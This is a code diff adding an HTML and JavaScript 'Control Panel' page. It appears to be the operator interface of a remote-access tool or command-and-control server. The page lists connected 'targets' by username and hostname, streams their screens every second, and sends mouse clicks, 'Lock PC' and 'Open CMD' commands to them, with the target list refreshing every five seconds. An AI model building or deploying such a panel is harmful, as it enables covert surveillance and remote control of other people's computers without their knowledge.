@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Control Panel</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0a0a; color: #00ff41; font-family: monospace; }
+        .container { display: flex; height: 100vh; padding: 10px; gap: 10px; }
+        .sidebar { width: 300px; background: #111; border: 1px solid #00ff41; padding: 15px; }
+        .main { flex: 1; display: flex; flex-direction: column; gap: 10px; }
+        .status-bar { background: #111; padding: 10px; border: 1px solid #00ff41; }
+        .screen { flex: 1; background: #000; border: 1px solid #00ff41; position: relative; }
+        .controls { background: #111; padding: 15px; border: 1px solid #00ff41; }
+        button { background: #222; color: #00ff41; border: 1px solid #00ff41; padding: 8px; cursor: pointer; }
+        button:hover { background: #00ff41; color: #000; }
+        .target-item { background: #222; padding: 10px; margin: 5px 0; cursor: pointer; }
+        .target-item:hover { border-color: #00ff41; }
+        .target-item.active { background: #003300; }
+        #screenImg { max-width: 100%; max-height: 100%; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="sidebar">
+            <h3>Connected Targets</h3>
+            <button onclick="loadTargets()">Refresh</button>
+            <div id="targetsList"></div>
+        </div>
+        <div class="main">
+            <div class="status-bar">
+                <span id="status">No target selected</span>
+                <button onclick="startStream()" id="startBtn">Start Stream</button>
+                <button onclick="stopStream()" id="stopBtn" disabled>Stop</button>
+            </div>
+            <div class="screen">
+                <img id="screenImg" src="" alt="Screen">
+                <div id="overlay">No active stream</div>
+            </div>
+            <div class="controls">
+                <button onclick="sendCommand('mouse', {action:'click', button:'left'})">Left Click</button>
+                <button onclick="sendCommand('mouse', {action:'click', button:'right'})">Right Click</button>
+                <button onclick="sendCommand('system', {command:'lock'})">Lock PC</button>
+                <button onclick="sendCommand('system', {command:'cmd'})">Open CMD</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentTarget = null;
+        let streamInterval = null;
+        const SERVER = window.location.origin;
+
+        async function loadTargets() {
+            const res = await fetch(`${SERVER}/api/targets`);
+            const targets = await res.json();
+            
+            const list = document.getElementById('targetsList');
+            list.innerHTML = '';
+            
+            targets.forEach(target => {
+                const div = document.createElement('div');
+                div.className = 'target-item';
+                if (currentTarget?.id === target.id) div.classList.add('active');
+                div.innerHTML = `${target.username}@${target.hostname}`;
+                div.onclick = () => selectTarget(target);
+                list.appendChild(div);
+            });
+        }
+
+        function selectTarget(target) {
+            currentTarget = target;
+            document.getElementById('status').textContent = `Selected: ${target.username}`;
+            loadTargets();
+        }
+
+        function startStream() {
+            if (!currentTarget) return;
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('stopBtn').disabled = false;
+            streamInterval = setInterval(updateScreen, 1000);
+            updateScreen();
+        }
+
+        function stopStream() {
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('stopBtn').disabled = true;
+            clearInterval(streamInterval);
+            document.getElementById('overlay').style.display = 'block';
+        }
+
+        async function updateScreen() {
+            if (!currentTarget) return;
+            try {
+                const res = await fetch(`${SERVER}/api/screen/${currentTarget.id}`);
+                if (res.ok) {
+                    const data = await res.json();
+                    document.getElementById('screenImg').src = 'data:image/jpeg;base64,' + data.screen;
+                    document.getElementById('overlay').style.display = 'none';
+                }
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        async function sendCommand(type, data) {
+            if (!currentTarget) return;
+            await fetch(`${SERVER}/api/commands`, {
+                method: 'POST',
+                headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({
+                    target_id: currentTarget.id,
+                    command: {type, data}
+                })
+            });
+        }
+
+        // Auto load targets every 5 seconds
+        setInterval(loadTargets, 5000);
+        loadTargets();
+    </script>
+</body>
+</html>
